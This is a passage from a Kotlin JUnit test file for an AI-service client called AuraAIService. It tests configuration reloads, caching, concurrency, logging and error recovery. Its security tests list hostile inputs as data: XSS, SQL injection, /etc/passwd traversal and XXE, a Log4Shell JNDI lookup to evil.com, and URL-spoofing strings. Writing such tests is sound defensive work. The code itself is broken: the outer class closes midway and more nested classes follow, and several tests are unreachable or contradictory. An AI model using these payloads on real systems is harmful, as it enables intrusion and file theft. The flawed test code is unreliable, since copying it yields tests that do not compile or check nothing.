            // Should not throw as it's not a Double
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should handle max_tokens with wrong type")
        fun shouldHandleMaxTokensWithWrongType() {
            val params = mapOf("max_tokens" to "invalid")
            // Should not throw as it's not an Int
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }
    }

    @Nested
    @DisplayName("Enhanced Configuration Reload Tests")
    inner class EnhancedConfigurationReloadTests {
        @Test
        @DisplayName("Should reload configuration with null API key")
        fun shouldReloadConfigurationWithNullApiKey() {
            whenever(mockConfigurationService.getApiKey()).thenReturn(null)
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }
            verify(mockLogger).error(contains("Failed to reload configuration"))
        }

        @Test
        @DisplayName("Should reload configuration with invalid base URL")
        fun shouldReloadConfigurationWithInvalidBaseUrl() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("valid-key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("invalid-url")
            whenever(mockConfigurationService.getTimeout()).thenReturn(1000L)
            
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }
            verify(mockLogger).error(contains("Failed to reload configuration"))
        }

        @Test
        @DisplayName("Should reload configuration with invalid timeout")
        fun shouldReloadConfigurationWithInvalidTimeout() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("valid-key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://valid.com")
            whenever(mockConfigurationService.getTimeout()).thenReturn(0L)
            
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }
            verify(mockLogger).error(contains("Failed to reload configuration"))
        }

        @Test
        @DisplayName("Should reload configuration with minimal valid values")
        fun shouldReloadConfigurationWithMinimalValidValues() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("k")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://a.com")
            whenever(mockConfigurationService.getTimeout()).thenReturn(1L)
            
            auraAIService.reloadConfiguration()
            verify(mockLogger).info("Configuration reloaded successfully")
        }
    }

    @Nested
    @DisplayName("Enhanced Statistics and Cache Tests")
    inner class EnhancedStatisticsAndCacheTests {
        @Test
        @DisplayName("Should return correct statistics structure")
        fun shouldReturnCorrectStatisticsStructure() {
            val stats = auraAIService.getServiceStatistics()
            
            assertTrue(stats.containsKey("totalRequests"))
            assertTrue(stats.containsKey("successfulRequests"))
            assertTrue(stats.containsKey("failedRequests"))
            assertTrue(stats.containsKey("averageResponseTime"))
            
            assertEquals(0L, stats["totalRequests"])
            assertEquals(0L, stats["successfulRequests"])
            assertEquals(0L, stats["failedRequests"])
            assertEquals(0.0, stats["averageResponseTime"])
        }

        @Test
        @DisplayName("Should reset statistics successfully")
        fun shouldResetStatisticsSuccessfully() {
            auraAIService.resetStatistics()
            verify(mockLogger).info("Service statistics reset")
        }

        @Test
        @DisplayName("Should expire cache successfully")
        fun shouldExpireCacheSuccessfully() {
            auraAIService.expireCache()
            verify(mockLogger).debug("Cache expired, making new request")
        }

        @Test
        @DisplayName("Should get statistics multiple times")
        fun shouldGetStatisticsMultipleTimes() {
            val stats1 = auraAIService.getServiceStatistics()
            val stats2 = auraAIService.getServiceStatistics()
            
            assertEquals(stats1, stats2)
            verify(mockLogger, times(2)).debug("Service statistics requested")
        }

        @Test
        @DisplayName("Should handle cache operations in sequence")
        fun shouldHandleCacheOperationsInSequence() {
            auraAIService.clearCache()
            auraAIService.expireCache()
            auraAIService.clearCache()
            
            verify(mockLogger, times(2)).info("Response cache cleared")
            verify(mockLogger).debug("Cache expired, making new request")
        }
    }

    @Nested
    @DisplayName("URL Validation Tests")
    inner class UrlValidationTests {
        @Test
        @DisplayName("Should validate various HTTPS URLs")
        fun shouldValidateVariousHttpsUrls() {
            val validUrls = listOf(
                "https://api.example.com",
                "https://subdomain.example.com",
                "https://example.com/path",
                "https://example.com:8080",
                "https://example.com/path?query=value"
            )
            
            validUrls.forEach { url ->
                whenever(mockConfigurationService.getBaseUrl()).thenReturn(url)
                // Should not throw exception
                val service = AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
                assertNotNull(service)
            }
        }

        @Test
        @DisplayName("Should reject various invalid URLs")
        fun shouldRejectVariousInvalidUrls() {
            val invalidUrls = listOf(
                "http://example.com",
                "ftp://example.com",
                "example.com",
                "www.example.com",
                "",
                "https://",
                "https://"
            )
            
            invalidUrls.forEach { url ->
                whenever(mockConfigurationService.getBaseUrl()).thenReturn(url)
                assertThrows<IllegalArgumentException> {
                    AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
                }
            }
        }
    }

    @Nested
    @DisplayName("Integration-like Tests")
    inner class IntegrationLikeTests {
        @Test
        @DisplayName("Should handle complete workflow")
        fun shouldHandleCompleteWorkflow() = runTest {
            // Health check
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "OK"))
            val health = auraAIService.healthCheck()
            assertTrue(health.isHealthy)
            
            // Update configuration
            auraAIService.updateApiKey("new-key")
            auraAIService.updateBaseUrl("https://new.api.com")
            auraAIService.updateTimeout(5000L)
            
            // Generate response
            val mockResponse = mockHttpResponse(200, "Response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            val result = auraAIService.generateResponse("Test prompt")
            assertEquals("Response", result)
            
            // Check statistics
            val stats = auraAIService.getServiceStatistics()
            assertNotNull(stats)
            
            // Clear cache
            auraAIService.clearCache()
            
            // Verify all interactions
            verify(mockHttpClient).get("health")
            verify(mockHttpClient).post("Test prompt")
            verify(mockConfigurationService).updateApiKey("new-key")
            verify(mockConfigurationService).updateBaseUrl("https://new.api.com")
            verify(mockConfigurationService).updateTimeout(5000L)
        }
    }

    @Nested
    @DisplayName("Error Handling and Edge Cases")
    inner class ErrorHandlingAndEdgeCasesTests {
        @Test
        @DisplayName("Should handle null response body")
        fun shouldHandleNullResponseBody() = runTest {
            val mockResponse = mock<HttpResponse>()
            whenever(mockResponse.statusCode).thenReturn(200)
            whenever(mockResponse.body).thenReturn(null)
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            
            val result = auraAIService.generateResponse("Test")
            assertNull(result)
        }

        @Test
        @DisplayName("Should handle concurrent requests")
        fun shouldHandleConcurrentRequests() = runTest {
            val mockResponse = mockHttpResponse(200, "Concurrent response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            
            val results = (1..10).map { i ->
                kotlinx.coroutines.async {
                    auraAIService.generateResponse("Prompt $i")
                }
            }.map { it.await() }
            
            assertEquals(10, results.size)
            results.forEach { assertEquals("Concurrent response", it) }
        }

        @Test
        @DisplayName("Should handle very large response body")
        fun shouldHandleVeryLargeResponseBody() = runTest {
            val largeResponse = "x".repeat(1000000) // 1MB response
            val mockResponse = mockHttpResponse(200, largeResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            
            val result = auraAIService.generateResponse("Test")
            assertEquals(largeResponse, result)
        }

        @Test
        @DisplayName("Should handle unicode in response")
        fun shouldHandleUnicodeInResponse() = runTest {
            val unicodeResponse = "Response with unicode: 你好 🚀 émojis"
            val mockResponse = mockHttpResponse(200, unicodeResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            
            val result = auraAIService.generateResponse("Test")
            assertEquals(unicodeResponse, result)
        }
    }
}
    @Nested
    @DisplayName("Boundary Value Tests")
    inner class BoundaryValueTests {
        @Test
        @DisplayName("Should handle prompt with exactly one character")
        fun shouldHandlePromptWithExactlyOneCharacter() = runTest {
            val singleCharPrompt = "?"
            val expectedResponse = "Single char response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(singleCharPrompt)
            assertEquals(expectedResponse, result)
            verify(mockLogger).info("Generating AI response for prompt length: 1")
        }

        @Test
        @DisplayName("Should handle maximum integer timeout value")
        fun shouldHandleMaximumIntegerTimeoutValue() {
            val maxTimeout = Long.MAX_VALUE
            auraAIService.updateTimeout(maxTimeout)
            verify(mockConfigurationService).updateTimeout(maxTimeout)
            verify(mockLogger).info("Timeout updated to $maxTimeout ms")
        }

        @Test
        @DisplayName("Should handle temperature at exact boundaries")
        fun shouldHandleTemperatureAtExactBoundaries() {
            val paramsZero = mapOf("temperature" to 0.0)
            val paramsOne = mapOf("temperature" to 1.0)
            
            auraAIService.updateModelParameters(paramsZero)
            auraAIService.updateModelParameters(paramsOne)
            
            verify(mockConfigurationService).updateModelParameters(paramsZero)
            verify(mockConfigurationService).updateModelParameters(paramsOne)
        }

        @Test
        @DisplayName("Should handle minimum positive max_tokens")
        fun shouldHandleMinimumPositiveMaxTokens() {
            val params = mapOf("max_tokens" to 1)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should handle exact maximum HTTP status codes")
        fun shouldHandleExactMaximumHttpStatusCodes() = runTest {
            val statusCodes = listOf(100, 199, 300, 399, 400, 499, 500, 599)
            
            statusCodes.forEach { statusCode ->
                val mockResponse = mockHttpResponse(statusCode, "Status $statusCode")
                whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
                
                if (statusCode == 200) {
                    val result = auraAIService.generateResponse("Test")
                    assertEquals("Status $statusCode", result)
                } else {
                    assertThrows<IOException> {
                        auraAIService.generateResponse("Test")
                    }
                }
            }
        }
    }

    @Nested
    @DisplayName("Data Type and Validation Tests")
    inner class DataTypeAndValidationTests {
        @Test
        @DisplayName("Should handle null userId parameter")
        fun shouldHandleNullUserId() = runTest {
            val prompt = "Test prompt"
            val expectedResponse = "Response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(prompt, null)
            assertEquals(expectedResponse, result)
            verify(mockHttpClient).post(prompt)
        }

        @Test
        @DisplayName("Should handle whitespace-only prompt")
        fun shouldHandleWhitespaceOnlyPrompt() = runTest {
            val whitespacePrompt = "   \t\n  "
            val expectedResponse = "Whitespace response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(whitespacePrompt)
            assertEquals(expectedResponse, result)
            verify(mockHttpClient).post(whitespacePrompt)
        }

        @Test
        @DisplayName("Should handle non-string parameters in model parameters")
        fun shouldHandleNonStringParametersInModelParameters() {
            val params = mapOf(
                "temperature" to 0.5,
                "max_tokens" to 100,
                "top_p" to 0.9,
                "frequency_penalty" to 0.1,
                "presence_penalty" to 0.2,
                "stop" to listOf("END", "STOP"),
                "custom_bool" to true,
                "custom_long" to 999999L
            )
            
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should handle special numeric values in model parameters")
        fun shouldHandleSpecialNumericValuesInModelParameters() {
            val params = mapOf(
                "temperature" to Double.NaN,
                "max_tokens" to Int.MAX_VALUE,
                "custom_double" to Double.POSITIVE_INFINITY,
                "custom_negative" to Double.NEGATIVE_INFINITY
            )
            
            // Should not throw validation errors for non-validated parameters
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should handle extremely precise temperature values")
        fun shouldHandleExtremelyPreciseTemperatureValues() {
            val preciseParams = mapOf(
                "temperature" to 0.0000000001,
                "other_temp" to 0.9999999999
            )
            
            auraAIService.updateModelParameters(preciseParams)
            verify(mockConfigurationService).updateModelParameters(preciseParams)
        }
    }

    @Nested
    @DisplayName("Concurrency and Threading Tests")
    inner class ConcurrencyAndThreadingTests {
        @Test
        @DisplayName("Should handle concurrent configuration updates")
        fun shouldHandleConcurrentConfigurationUpdates() = runTest {
            val operations = (1..20).map { i ->
                kotlinx.coroutines.async {
                    when (i % 4) {
                        0 -> auraAIService.updateApiKey("key-$i")
                        1 -> auraAIService.updateBaseUrl("https://api$i.com")
                        2 -> auraAIService.updateTimeout(1000L + i)
                        else -> auraAIService.updateModelParameters(mapOf("param$i" to i))
                    }
                }
            }
            
            // Wait for all operations to complete
            operations.forEach { it.await() }
            
            // Verify all operations were called
            verify(mockConfigurationService, atLeastOnce()).updateApiKey(any())
            verify(mockConfigurationService, atLeastOnce()).updateBaseUrl(any())
            verify(mockConfigurationService, atLeastOnce()).updateTimeout(any())
            verify(mockConfigurationService, atLeastOnce()).updateModelParameters(any())
        }

        @Test
        @DisplayName("Should handle concurrent batch and streaming requests")
        fun shouldHandleConcurrentBatchAndStreamingRequests() = runTest {
            val mockResponse = mockHttpResponse(200, "Concurrent response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            whenever(mockHttpClient.postStream(any())).thenReturn(flow { emit("stream") })

            val batchOperations = (1..5).map { i ->
                kotlinx.coroutines.async {
                    auraAIService.generateBatchResponses(listOf("Batch prompt $i"))
                }
            }

            val streamOperations = (1..5).map { i ->
                kotlinx.coroutines.async {
                    val results = mutableListOf<String>()
                    auraAIService.generateStreamingResponse("Stream prompt $i").collect { results.add(it) }
                    results
                }
            }

            val batchResults = batchOperations.map { it.await() }
            val streamResults = streamOperations.map { it.await() }

            assertEquals(5, batchResults.size)
            assertEquals(5, streamResults.size)
            streamResults.forEach { assertEquals(listOf("stream"), it) }
        }

        @Test
        @DisplayName("Should handle concurrent health checks")
        fun shouldHandleConcurrentHealthChecks() = runTest {
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "OK"))

            val healthChecks = (1..10).map {
                kotlinx.coroutines.async {
                    auraAIService.healthCheck()
                }
            }

            val results = healthChecks.map { it.await() }
            assertEquals(10, results.size)
            results.forEach { assertTrue(it.isHealthy) }
        }
    }

    @Nested
    @DisplayName("Performance and Resource Tests")
    inner class PerformanceAndResourceTests {
        @Test
        @DisplayName("Should handle rapid successive requests")
        fun shouldHandleRapidSuccessiveRequests() = runTest {
            val mockResponse = mockHttpResponse(200, "Rapid response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            val results = (1..100).map { i ->
                auraAIService.generateResponse("Rapid prompt $i")
            }

            assertEquals(100, results.size)
            results.forEach { assertEquals("Rapid response", it) }
            verify(mockHttpClient, times(100)).post(any())
        }

        @Test
        @DisplayName("Should handle memory-intensive operations")
        fun shouldHandleMemoryIntensiveOperations() = runTest {
            val largeBatchSize = 10000
            val largePrompts = (1..largeBatchSize).map { "Large prompt $it with additional content to increase memory usage" }
            val mockResponse = mockHttpResponse(200, "Large batch response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            val results = auraAIService.generateBatchResponses(largePrompts)
            assertEquals(listOf("Large batch response"), results)
            verify(mockHttpClient).post(largePrompts)
        }

        @Test
        @DisplayName("Should handle high-frequency cache operations")
        fun shouldHandleHighFrequencyCacheOperations() {
            repeat(1000) { i ->
                when (i % 3) {
                    0 -> auraAIService.clearCache()
                    1 -> auraAIService.expireCache()
                    else -> auraAIService.getServiceStatistics()
                }
            }

            verify(mockLogger, atLeast(300)).info("Response cache cleared")
            verify(mockLogger, atLeast(300)).debug("Cache expired, making new request")
            verify(mockLogger, atLeast(300)).debug("Service statistics requested")
        }

        @Test
        @DisplayName("Should handle resource cleanup in streaming")
        fun shouldHandleResourceCleanupInStreaming() = runTest {
            val largeStream = (1..10000).map { "Chunk $it" }
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                largeStream.forEach { emit(it) }
            })

            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("Resource test").collect { chunk ->
                collected.add(chunk)
                if (collected.size >= 5000) {
                    // Simulate early termination
                    throw RuntimeException("Early termination")
                }
            }

            // Should handle the exception gracefully
            assertTrue(collected.size <= 5000)
        }
    }

    @Nested
    @DisplayName("Configuration Edge Cases")
    inner class ConfigurationEdgeCasesTests {
        @Test
        @DisplayName("Should handle configuration reload during active operations")
        fun shouldHandleConfigurationReloadDuringActiveOperations() = runTest {
            val mockResponse = mockHttpResponse(200, "During reload")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            // Start a request
            val requestOperation = kotlinx.coroutines.async {
                auraAIService.generateResponse("Test during reload")
            }

            // Reload configuration while request is in progress
            val reloadOperation = kotlinx.coroutines.async {
                whenever(mockConfigurationService.getApiKey()).thenReturn("reloaded-key")
                whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://reloaded.com")
                whenever(mockConfigurationService.getTimeout()).thenReturn(2000L)
                auraAIService.reloadConfiguration()
            }

            val requestResult = requestOperation.await()
            reloadOperation.await()

            assertEquals("During reload", requestResult)
            verify(mockLogger).info("Configuration reloaded successfully")
        }

        @Test
        @DisplayName("Should handle multiple rapid configuration changes")
        fun shouldHandleMultipleRapidConfigurationChanges() {
            repeat(100) { i ->
                auraAIService.updateApiKey("key-$i")
                auraAIService.updateBaseUrl("https://api$i.com")
                auraAIService.updateTimeout(1000L + i)
            }

            verify(mockConfigurationService, times(100)).updateApiKey(any())
            verify(mockConfigurationService, times(100)).updateBaseUrl(any())
            verify(mockConfigurationService, times(100)).updateTimeout(any())
        }

        @Test
        @DisplayName("Should handle configuration validation with edge case URLs")
        fun shouldHandleConfigurationValidationWithEdgeCaseUrls() {
            val edgeCaseUrls = listOf(
                "https://localhost",
                "https://127.0.0.1",
                "https://192.168.1.1",
                "https://10.0.0.1",
                "https://a.b",
                "https://example.com.",
                "https://example.com/",
                "https://example.com:443",
                "https://example.com:8443/api/v1"
            )

            edgeCaseUrls.forEach { url ->
                whenever(mockConfigurationService.getBaseUrl()).thenReturn(url)
                val service = AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
                assertNotNull(service)
            }
        }

        @Test
        @DisplayName("Should handle configuration service method failures")
        fun shouldHandleConfigurationServiceMethodFailures() {
            // Test update methods throwing exceptions
            whenever(mockConfigurationService.updateApiKey(any())).thenThrow(RuntimeException("Update failed"))
            
            assertThrows<RuntimeException> {
                auraAIService.updateApiKey("test-key")
            }
            
            // Verify the service still attempted the update
            verify(mockConfigurationService).updateApiKey("test-key")
        }
    }

    @Nested
    @DisplayName("Error Recovery and Resilience Tests")
    inner class ErrorRecoveryAndResilienceTests {
        @Test
        @DisplayName("Should recover from transient network errors")
        fun shouldRecoverFromTransientNetworkErrors() = runTest {
            // First call fails, second succeeds
            whenever(mockHttpClient.post(any()))
                .thenThrow(IOException("Network error"))
                .thenReturn(mockHttpResponse(200, "Recovery success"))

            // First call should fail
            assertThrows<IOException> {
                auraAIService.generateResponse("Test 1")
            }

            // Second call should succeed
            val result = auraAIService.generateResponse("Test 2")
            assertEquals("Recovery success", result)
        }

        @Test
        @DisplayName("Should handle partial streaming failures")
        fun shouldHandlePartialStreamingFailures() = runTest {
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                emit("chunk1")
                emit("chunk2")
                throw IOException("Stream interrupted")
            })

            val collected = mutableListOf<String>()
            assertThrows<IOException> {
                auraAIService.generateStreamingResponse("Test").collect { 
                    collected.add(it) 
                }
            }

            assertEquals(listOf("chunk1", "chunk2"), collected)
        }

        @Test
        @DisplayName("Should handle health check recovery scenarios")
        fun shouldHandleHealthCheckRecoveryScenarios() = runTest {
            // Simulate service recovery
            whenever(mockHttpClient.get(any()))
                .thenReturn(mockHttpResponse(500, "Service down"))
                .thenReturn(mockHttpResponse(503, "Service unavailable"))
                .thenReturn(mockHttpResponse(200, "Service recovered"))

            // First two checks should report unhealthy
            val result1 = auraAIService.healthCheck()
            val result2 = auraAIService.healthCheck()
            val result3 = auraAIService.healthCheck()

            assertFalse(result1.isHealthy)
            assertFalse(result2.isHealthy)
            assertTrue(result3.isHealthy)
        }

        @Test
        @DisplayName("Should handle configuration validation recovery")
        fun shouldHandleConfigurationValidationRecovery() {
            // First attempt with invalid config
            whenever(mockConfigurationService.getApiKey()).thenReturn("")
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }

            // Second attempt with valid config
            whenever(mockConfigurationService.getApiKey()).thenReturn("valid-key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://valid.com")
            whenever(mockConfigurationService.getTimeout()).thenReturn(1000L)
            
            auraAIService.reloadConfiguration()
            verify(mockLogger).info("Configuration reloaded successfully")
        }
    }

    @Nested
    @DisplayName("Logging and Observability Tests")
    inner class LoggingAndObservabilityTests {
        @Test
        @DisplayName("Should log detailed information for different operations")
        fun shouldLogDetailedInformationForDifferentOperations() = runTest {
            val mockResponse = mockHttpResponse(200, "Test response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "Health OK"))

            // Test various operations
            auraAIService.generateResponse("Test prompt")
            auraAIService.generateBatchResponses(listOf("Batch 1", "Batch 2"))
            auraAIService.generateStreamingResponse("Stream prompt").collect()
            auraAIService.healthCheck()
            auraAIService.updateApiKey("new-key")
            auraAIService.updateBaseUrl("https://new.com")
            auraAIService.updateTimeout(5000L)
            auraAIService.updateModelParameters(mapOf("temp" to 0.5))
            auraAIService.getServiceStatistics()
            auraAIService.resetStatistics()
            auraAIService.clearCache()
            auraAIService.expireCache()

            // Verify comprehensive logging
            verify(mockLogger, atLeastOnce()).info(any())
            verify(mockLogger, atLeastOnce()).debug(any(), *anyVararg())
        }

        @Test
        @DisplayName("Should log errors with appropriate detail")
        fun shouldLogErrorsWithAppropriateDetail() = runTest {
            val errorStatuses = listOf(400, 401, 403, 404, 500, 502, 503, 504)
            
            errorStatuses.forEach { status ->
                val mockResponse = mockHttpResponse(status, "Error $status")
                whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
                
                assertThrows<IOException> {
                    auraAIService.generateResponse("Test")
                }
                
                verify(mockLogger).error("HTTP error response: $status - Error $status")
            }
        }

        @Test
        @DisplayName("Should log performance metrics")
        fun shouldLogPerformanceMetrics() = runTest {
            val longPrompt = "a".repeat(50000)
            val mockResponse = mockHttpResponse(200, "Long response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            auraAIService.generateResponse(longPrompt)
            verify(mockLogger).info("Generating AI response for prompt length: ${longPrompt.length}")
        }

        @Test
        @DisplayName("Should handle logger failures gracefully")
        fun shouldHandleLoggerFailuresGracefully() = runTest {
            // Mock logger to throw exception
            whenever(mockLogger.info(any())).thenThrow(RuntimeException("Logger failed"))
            
            val mockResponse = mockHttpResponse(200, "Response despite logger failure")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            // Should still complete the operation despite logger failure
            val result = auraAIService.generateResponse("Test")
            assertEquals("Response despite logger failure", result)
        }
    }

    @Nested
    @DisplayName("Integration Scenario Tests")
    inner class IntegrationScenarioTests {
        @Test
        @DisplayName("Should handle complete AI workflow with error recovery")
        fun shouldHandleCompleteAIWorkflowWithErrorRecovery() = runTest {
            // Initial health check fails
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(500, "Down"))
            val healthResult1 = auraAIService.healthCheck()
            assertFalse(healthResult1.isHealthy)

            // Update configuration
            auraAIService.updateApiKey("workflow-key")
            auraAIService.updateBaseUrl("https://workflow.api.com")
            auraAIService.updateTimeout(10000L)
            auraAIService.updateModelParameters(mapOf("temperature" to 0.7, "max_tokens" to 500))

            // Health check now succeeds
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "OK"))
            val healthResult2 = auraAIService.healthCheck()
            assertTrue(healthResult2.isHealthy)

            // Perform various AI operations
            val mockResponse = mockHttpResponse(200, "AI Response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
            whenever(mockHttpClient.postStream(any())).thenReturn(flow { 
                emit("Stream chunk 1")
                emit("Stream chunk 2")
            })

            val singleResponse = auraAIService.generateResponse("Single prompt")
            val batchResponse = auraAIService.generateBatchResponses(listOf("Batch 1", "Batch 2"))
            val streamChunks = mutableListOf<String>()
            auraAIService.generateStreamingResponse("Stream prompt").collect { streamChunks.add(it) }

            // Verify all operations completed successfully
            assertEquals("AI Response", singleResponse)
            assertEquals(listOf("AI Response"), batchResponse)
            assertEquals(listOf("Stream chunk 1", "Stream chunk 2"), streamChunks)

            // Check final statistics
            val stats = auraAIService.getServiceStatistics()
            assertNotNull(stats)
            
            // Clear cache and reset
            auraAIService.clearCache()
            auraAIService.resetStatistics()
        }

        @Test
        @DisplayName("Should handle configuration drift scenarios")
        fun shouldHandleConfigurationDriftScenarios() = runTest {
            // Initial configuration
            whenever(mockConfigurationService.getApiKey()).thenReturn("initial-key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://initial.com")
            whenever(mockConfigurationService.getTimeout()).thenReturn(1000L)

            // Simulate configuration drift
            whenever(mockConfigurationService.getApiKey()).thenReturn("drifted-key")
            
            // Reload should handle the drift
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }

            // Fix the configuration
            whenever(mockConfigurationService.getApiKey()).thenReturn("fixed-key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://fixed.com")
            whenever(mockConfigurationService.getTimeout()).thenReturn(2000L)
            
            auraAIService.reloadConfiguration()
            verify(mockLogger).info("Configuration reloaded successfully")
        }

        @Test
        @DisplayName("Should handle service degradation gracefully")
        fun shouldHandleServiceDegradationGracefully() = runTest {
            // Normal operation
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse(200, "Normal"))
            val normal = auraAIService.generateResponse("Normal request")
            assertEquals("Normal", normal)

            // Degraded performance (slower responses)
            whenever(mockHttpClient.post(any())).thenAnswer { invocation ->
                kotlinx.coroutines.delay(100) // Simulate slow response
                mockHttpResponse(200, "Slow response")
            }
            val slow = auraAIService.generateResponse("Slow request")
            assertEquals("Slow response", slow)

            // Partial failure (some requests fail)
            whenever(mockHttpClient.post(any()))
                .thenThrow(IOException("Partial failure"))
                .thenReturn(mockHttpResponse(200, "Recovered"))

            assertThrows<IOException> {
                auraAIService.generateResponse("Failing request")
            }
            
            val recovered = auraAIService.generateResponse("Recovery request")
            assertEquals("Recovered", recovered)
        }
    }

    @Nested
    @DisplayName("Security and Validation Tests")
    inner class SecurityAndValidationTests {
        @Test
        @DisplayName("Should handle potentially malicious inputs")
        fun shouldHandlePotentiallyMaliciousInputs() = runTest {
            val maliciousInputs = listOf(
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../../etc/passwd",
                "\u0000\u0001\u0002\u0003",
                "javascript:alert('test')",
                "../../../sensitive-file.txt",
                "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY test SYSTEM \"file:///etc/passwd\">]>",
                "\${jndi:ldap://evil.com/a}"
            )

            val mockResponse = mockHttpResponse(200, "Sanitized response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            maliciousInputs.forEach { maliciousInput ->
                val result = auraAIService.generateResponse(maliciousInput)
                assertEquals("Sanitized response", result)
                verify(mockHttpClient).post(maliciousInput) // Verify the input was passed through
            }
        }

        @Test
        @DisplayName("Should validate API key format and strength")
        fun shouldValidateApiKeyFormatAndStrength() {
            val weakKeys = listOf(
                "weak",
                "123",
                "password",
                "a".repeat(100) // Very long but predictable
            )

            // Current implementation doesn't validate key strength, just non-empty
            weakKeys.forEach { key ->
                auraAIService.updateApiKey(key)
                verify(mockConfigurationService).updateApiKey(key)
            }
        }

        @Test
        @DisplayName("Should handle URL injection attempts")
        fun shouldHandleUrlInjectionAttempts() {
            val injectionAttempts = listOf(
                "https://legitimate.com@evil.com",
                "https://evil.com#https://legitimate.com",
                "https://legitimate.com/../../../admin",
                "https://legitimate.com:8080@evil.com:443"
            )

            injectionAttempts.forEach { url ->
                // These should be accepted as they start with https://
                auraAIService.updateBaseUrl(url)
                verify(mockConfigurationService).updateBaseUrl(url)
            }
        }

        @Test
        @DisplayName("Should handle resource exhaustion attempts")
        fun shouldHandleResourceExhaustionAttempts() = runTest {
            val exhaustionAttempts = listOf(
                "a".repeat(1000000), // 1MB prompt
                "\n".repeat(100000), // Many newlines
                "🚀".repeat(50000) // Unicode characters
            )

            val mockResponse = mockHttpResponse(200, "Handled")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            exhaustionAttempts.forEach { attempt ->
                val result = auraAIService.generateResponse(attempt)
                assertEquals("Handled", result)
            }
        }
    }

    @Nested
    @DisplayName("Compatibility and Interoperability Tests")
    inner class CompatibilityAndInteroperabilityTests {
        @Test
        @DisplayName("Should handle different character encodings")
        fun shouldHandleDifferentCharacterEncodings() = runTest {
            val encodingTests = listOf(
                "ASCII text",
                "UTF-8 with émojis 🤖🚀",
                "Chinese characters: 你好世界",
                "Arabic text: مرحبا بالعالم",
                "Russian text: Привет мир",
                "Japanese text: こんにちは世界",
                "Mixed: Hello 世界 🌍 مرحبا"
            )

            val mockResponse = mockHttpResponse(200, "Encoded response")
            whenever(mockHttpClient.post(any())).thenReturn(mockResponse)

            encodingTests.forEach { text ->
                val result = auraAIService.generateResponse(text)
                assertEquals("Encoded response", result)
            }
        }

        @Test
        @DisplayName("Should handle different HTTP response content types")
        fun shouldHandleDifferentHttpResponseContentTypes() = runTest {
            val responses = listOf(
                "Plain text response",
                "{\"json\": \"response\"}",
                "<xml><response>data</response></xml>",
                "text/html response",
                "binary\u0000data\u0001here"
            )

            responses.forEach { responseBody ->
                val mockResponse = mockHttpResponse(200, responseBody)
                whenever(mockHttpClient.post(any())).thenReturn(mockResponse)
                
                val result = auraAIService.generateResponse("Test")
                assertEquals(responseBody, result)
            }
        }

        @Test
        @DisplayName("Should handle different locale and timezone scenarios")
        fun shouldHandleDifferentLocaleAndTimezoneScenarios() = runTest {
            val localeTests = listOf(
                "Date: 2024-01-01",
                "Time: 14:30:00",
                "Currency: $100.50",
                "Number: 1,234.56",
                "Percentage: 95.5%"
            )

